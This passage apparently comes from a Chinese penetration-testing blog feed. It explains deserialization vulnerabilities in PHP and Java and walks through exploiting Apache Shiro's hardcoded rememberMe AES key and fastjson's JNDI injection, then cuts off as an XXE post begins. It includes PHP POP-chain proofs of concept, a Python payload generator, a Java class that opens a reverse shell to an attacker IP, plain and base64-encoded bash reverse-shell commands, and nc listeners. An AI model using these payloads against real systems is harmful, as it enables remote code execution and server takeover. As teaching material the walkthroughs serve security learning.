title="利用条件"></a>利用条件</h3><ol><li>反序列化函数中的<strong>参数可控</strong>（Java反序列化等）</li><li>存在可利用的类，且类中有<strong>魔术方法</strong>（php、python反序列化等）</li></ol><p>例如，有如下PHP实例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$id</span> = <span class="string">&#x27;Baize&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;id);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];</span><br><span class="line"><span class="variable">$test2</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以确定可控参数是GET型string参数，并且后端接收参数后会进行反序列化操作。同时，test类中存在__wakeup魔术方法，操作是eval($id)。</p><p>那么我们思路是：构造test类的序列化字符串，使得反序列化后的$id值为要执行的操作（代码执行漏洞），例如我们要执行phpinfo()，那么可以构造这样一个字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;s:2:&quot;id&quot;;s:10:&quot;phpinfo();&quot;&#125;</span><br></pre></td></tr></table></figure><p>这样反序列化会时就会自动调用<code>__wakeup</code>魔术方法，即执行<code>eval(phpinfo();)</code>。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813131438447.png" alt="image-20220813131438447"></p><h3 id="POP链构造（php）"><a href="#POP链构造（php）" class="headerlink" title="POP链构造（php）"></a>POP链构造（php）</h3><p>其实实际中基本不会有上述实例这种这么简单的利用过程，更多的则是需要通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。关注整个函数的调用过程中参数的传递情况，找到可利用的点。</p><p>**POP CHAIN(POP链)**：</p><p>通过用户可控的反序列化操作，其中可触发的魔术方法为出发点，在魔术方法中的函数在其他类中存在同名函数，或通过传递，关联等可以调用的其他执行敏感操作的函数，然后传递参数执行敏感操作，即</p><p><strong>用户可控反序列化→魔术方法→魔术方法中调用的其他函数→同名函数或通过传递可调用的函数→敏感操作</strong></p><h4 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h4><p>test.php内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Test3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;   <span class="comment"># 如果$obj变量存在则返回调用$obj对象中的Delete()函数</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj)) <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">Delete</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;  <span class="comment"># 存在任意文件删除的漏洞</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$cache_file</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123;     <span class="comment"># 如果定义的$file变量中的文件存在，则删除此文件并返回提示内容</span></span><br><span class="line"><span class="variable">$file</span> = “/<span class="keyword">var</span>/www/html/cache/tmp/&#123;<span class="variable language_">$this</span>-&gt;cache_file&#125;”;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;I am a evil Delete function&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;I am a safe Delete function&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user_data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$user_data</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>代码分析：</strong></p><p>首先我们看最先执行的操作在最下面反序列化GET到的参数data，然后执行echo，这里如果$user_data是一个类实例化来的对象的话，就是将对象作为字符串输出，会触发对象中的<code>__tostring()</code>魔术方法。</p><p>而源码中有三个类，各个类具有不同的方法。</p><blockquote><h4 id="POP链构造："><a href="#POP链构造：" class="headerlink" title="POP链构造："></a>POP链构造：</h4><p>首先出发点是Test1中的<code>__tostring()</code>魔术方法，其中调用了<code>$this-&gt;obj</code>中的Delete()函数，而<code>$this-&gt;obj</code>在实例化对象时会触发<code>__construct</code>方法，将<code>$this-&gt;obj</code>作为实例化Test3类的对象，那么此时调用的就是Test3类中的Delete()函数，只返回一句提示，那么此时的执行流如下：</p><p>实例化Test1类的对象→<code>__construct()</code>→<code>$this-&gt;obj=new Test3</code>→输出该对象时调用<code>__tostring()</code>→Test3的Delete()方法</p><p>不过在Test2类中也定义了和Test3中同名的函数Delete()，该方法可能造成任意文件删除。那么我们可以通过构造特定的反序列化参数来<strong>修改执行流，也就是构造我们自己的POP链，在反序列化后使用Test2类中的Delete()来执行敏感操作</strong>，让执行流如下:</p><p>实例化Test1类的对象→<code>__construct()</code>→<code>$this-&gt;obj=new Test2</code>→输出该对象时调用<code>__tostring()</code>→Test2的Delete方法</p><p>那么POP链的构造就是通过反序列化和echo来触发<code>__tostring()</code>魔术方法，并且此方法中调用Test2中的Delete()方法，造成任意文件删除的危害。</p></blockquote><p>POC如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Test2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$cache_file</span> = <span class="string">&#x27;../../../../test.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$evil</span> = <span class="keyword">new</span> <span class="title class_">Test1</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$evil</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="java反射机制"><a href="#java反射机制" class="headerlink" title="java反射机制"></a>java反射机制</h3><p>反射 (Reflection) 是 Java 的特征之一，它允许运行中的 Java 程序获取自身的信息，并且可以操作类或对象的内部属性。通过反射，我们可以在运行时获得程序或程序集中每一个类型的成员和成员的信息。通过Java 反射机制，我们可以动态地创建对象并调用其属性，这样的对象的类型在编译期是未知的。</p><p>反射的核心是 JVM 在运行时才动态加载类或调用方法&#x2F;访问属性，它不需要事先（写代码的时候或编译期）知道运行对象是谁。</p><p>Java 反射主要提供以下功能：</p><p>在运行时判断任意一个对象所属的类；<br>在运行时构造任意一个类的对象；<br>在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；<br>在运行时调用任意一个对象的方法<br>重点：是运行时而不是编译时</p><p>反射机制在java反序列化漏洞的利用过程中有很重要的作用。</p><h3 id="java反序列化利用"><a href="#java反序列化利用" class="headerlink" title="java反序列化利用"></a>java反序列化利用</h3><p>Java 序列化过程依赖于 ObjectOutputStream 类中 writeObject 方法，而反序列化的过程是依赖于 ObjectOutputStream 类中 readObject 方法。<strong>若用户重写了自定义的 readObject 方法，那么就有可能产生反序列化的时候命令执行的漏洞点。</strong>或者用户精心构造恶意的类的序列化字符串，那么在反序列化实例化这个类时就会执行其中的恶意代码（比如rmi远程代码）。</p><p>利用java反射重写 readObject 方法：</p><p>反射机制的存在使得我们可以越过Java本身的静态检查和类型约束，在运行期直接访问和修改目标对象的属性和状态。Java反射的四大核心是 Class，Constructor，Field，Method。通过反射的方法重写readObject：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ReflectionCalcObject.java</span></span><br><span class="line"><span class="keyword">package</span> com.l1nk3r.reflect;</span><br><span class="line"><span class="keyword">import</span> java.io. * ;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectionCalcObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//重写readObject()方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in )</span> <span class="keyword">throws</span> IOException,</span><br><span class="line">    ClassNotFoundException &#123; in .defaultReadObject(); <span class="comment">//调用原始的readOject方法</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//通过反射方法执行命令；</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> java.lang.Runtime.class.getMethod(“exec”, String.class);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(Runtime.getRuntime(), “open / Applications / Calculator.app / “);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过运行 java.lang.Runtime 这个类的 .class 属性，并使用 getMethod 方法来获取我们要执行命令的方法 exec ，最后我们通过 invoke 来实现注册这个方法，打开计算器。</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul><li><p>最有效的方法是<strong>不接受来自不受信任源的序列化对象</strong>或者只使用原始数据类型的序列化，但这不容易实现。</p></li><li><p><strong>完整性检查</strong>，如：对序列化对象进行数字签名，以防止创建恶意对象或序列化数据被篡改。</p></li><li><p>在创建对象前强制执行<strong>类型约束</strong>，因为用户的代码通常被期望使用一组可定义的类。</p></li></ul><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="wakeup-函数绕过"><a href="#wakeup-函数绕过" class="headerlink" title="__wakeup()函数绕过"></a>__wakeup()函数绕过</h3><p>只要序列化的中的成员数大于实际成员数，<code>__wakeup()</code>魔术方法将不会被执行，从而导致绕过。</p><p>注意，需要<strong>PHP版本&lt;&#x3D;5.6.25或者PHP版本&lt;&#x3D;7.0.11</strong>。</p><p>举一个简单的例子，考虑一个使用序列化<code>User</code>对象的网站，该网站将有关用户会话的数据存储在cookie中。如果攻击者在HTTP请求中发现了序列化对象，则可能会对其进行解码以找到以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:”username”:s:6:”carlos”; s:7:”isAdmin”:b:0;&#125;</span><br></pre></td></tr></table></figure><p>注意到这里的isAdmin属性，攻击者可以简单地将该属性的布尔值更改为<code>1</code>(true)，重新编码对象，然后使用此修改后的值覆盖其当前cookie。</p><p>以及，修改</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>参考：<a href="https://www.freebuf.com/articles/web/286442.html">https://www.freebuf.com/articles/web/286442.html</a></p><h3 id="shiro反序列化漏洞"><a href="#shiro反序列化漏洞" class="headerlink" title="shiro反序列化漏洞"></a>shiro反序列化漏洞</h3><p><a href="https://blog.csdn.net/huangyongkang666/article/details/124175812">https://blog.csdn.net/huangyongkang666/article/details/124175812</a></p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>低版本的apache shiro （ &lt;&#x3D; 1.2.4版本）默认使用了CookieRememberMeManager。当用户勾选RememberMe并登录成功，Shiro会将用户的cookie值序列化，AES加密，接着base64编码后存储在cookie的rememberMe字段中。而服务端接收到cookie后：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。然而AES的密钥是硬编码在源码中的，所以当攻击者知道了AES key后，就能够构造恶意的rememberMe cookie值从而导致反序列化的RCE漏洞。</p><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><p>返回包中含有rememberMe&#x3D;deleteMe字段</p><h4 id="用到的工具"><a href="#用到的工具" class="headerlink" title="用到的工具"></a>用到的工具</h4><ol><li><p><strong>ysoserial</strong></p><p>ysoserial集合了各种java反序列化payload，下载地址为<code>https://github.com/frohoff/ysoserial</code>。</p><p>安装过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/frohoff/ysoserial.git</span><br><span class="line">cd ysoserial</span><br><span class="line">mvn package -D skipTests //需要安装maven才能使用mvn命令</span><br></pre></td></tr></table></figure></li><li><p><strong>shiro_tool.jar</strong></p><p>集成化工具，下载地址为<code>https://toolaffix.oss-cn-beijing.aliyuncs.com/shiro_tool.jar</code>。</p><p>可用于获取目标IP的shiro中是否存在默认的AES密钥。命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar shiro_tool.jar http://192.168.241.129:8080</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813135453985.png" alt="image-20220813135453985"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure></li></ol><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul><li><p><strong>测试</strong>能否使用rememberMe字段</p><p>使用burp抓取当前页面数据包，在cookie中添加rememberMe&#x3D;1。若响应包中显示Set-Cookie: rememberMe&#x3D;deleteMe，说明存在shiro框架，可能存在漏洞。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813135630795.png" alt="image-20220813135630795"></p></li><li><p><strong>监听并构造反弹shell</strong></p><p>通过 <strong>ysoserial</strong> 中的 JRMP 监听模块，监听4444端口并执行反弹shell命令。</p><p>反弹shell命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.241.128/4444 0&gt;&amp;1   //需要base64编码，在线编码http://www.jackson-t.ca/runtime-exec-payloads.html</span><br><span class="line"></span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0MS4xMjgvNDQ0NCAwPiYx==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0MS4xMjgvNDQ0NCAwPiYx==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></pre></td></tr></table></figure><p>单引号中的就是要执行的命令</p></li><li><p><strong>构造payload</strong></p><p>利用检测出的AES密钥，生成payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>(<span class="params">command</span>):   <span class="comment"># shellcode</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial.jar&#x27;</span>, <span class="string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)  <span class="comment"># AES密钥</span></span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure><p>执行上述代码：<code>python shiro.py 192.168.241.129:6666</code>，得到payload，即恶意的rememberMe。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813140942501.png" alt="image-20220813140942501"></p></li><li><p><strong>开启nc监听</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 6767</span><br></pre></td></tr></table></figure></li><li><p><strong>抓包，插入恶意rememberMe</strong></p><p>抓包，在cookie中将上面恶意构造的rememberMe发送出去：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813141259824.png" alt="image-20220813141259824"></p></li><li><p><strong>成功getshell</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813141345531.png" alt="image-20220813141345531"></p></li></ul><h3 id="fastjson反序列化漏洞"><a href="#fastjson反序列化漏洞" class="headerlink" title="fastjson反序列化漏洞"></a>fastjson反序列化漏洞</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set&#x2F;get方法来访问属性。</p><p>在Java 8u102环境下，没有com.sun.jndi.rmi.object.trustURLCodebase的限制，可以使用com.sun.rowset.JdbcRowSetImpl的利用链，借助JNDI注入来执行命令。</p><h4 id="用到的工具-1"><a href="#用到的工具-1" class="headerlink" title="用到的工具"></a>用到的工具</h4><p>预先安装maven并配置环境变量，下载marshalsec，进入marshalsec 目录，使用mvn clean package -DskipTests命令编译出marshalsec的jar包</p><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul><li><p><strong>生成payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.2.101/6767 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line"><span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">pc.waitFor();</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">// do nothing</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行编译生成.class文件。搭建服务，要测试能直连TouchFile.class ，才会执行文件里的命令。</p></li><li><p><strong>开启rmi服务</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.2.101:4444/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure><p>其中<code>http://192.168.2.101:4444</code>为你的rmi服务器的地址，9999为rmi监听的端口</p></li><li><p><strong>开启nc监听</strong>，6767为监听的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 6767</span><br></pre></td></tr></table></figure></li><li><p><strong>发包</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813142233557.png" alt="image-20220813142233557"></p></li><li><p><strong>获得shell</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813142311472.png" alt="image-20220813142311472"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;反序列化漏洞&quot;&gt;&lt;a href=&quot;#反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;反序列化漏洞&quot;&gt;&lt;/a&gt;反序列化漏洞&lt;/h1&gt;&lt;p&gt;参考：&lt;a href=&quot;https://www.anquanke.com/post/id/224769&quot;&gt;h</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>XXE</title>
    <link href="https://frankcao3.github.io/posts/57467"/>
    <id>https://frankcao3.github.io/posts/57467</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.974Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/08DlKYbVXPtjIK856PBf8w">https://mp.weixin.qq.com/s/08DlKYbVXPtjIK856PBf8w</a></p><p><a href="https://blog.csdn.net/huangyongkang666/article/details/123818066">https://blog.csdn.net/huangyongkang666/article/details/123818066</a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>XML外部实体注入(XML External Entity) 简称XXE漏洞。</p><h3 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h3><h4 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h4><p> XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- XML声明 --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- DTD文档类型定义（可选） --&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 文档元素 --&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget me this weekend&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>XML 是一种很像HTML的标记语言。<br>XML 的设计宗旨是 <strong>传输数据</strong>，而不是显示数据。<br>XML 标签没有被预定义。需要<strong>自行定义标签</strong>。<br>XML 被设计为具有自我描述性。</p><h4 id="XML-和-HTML-之间的差异"><a href="#XML-和-HTML-之间的差异" class="headerlink" title="XML 和 HTML 之间的差异"></a>XML 和 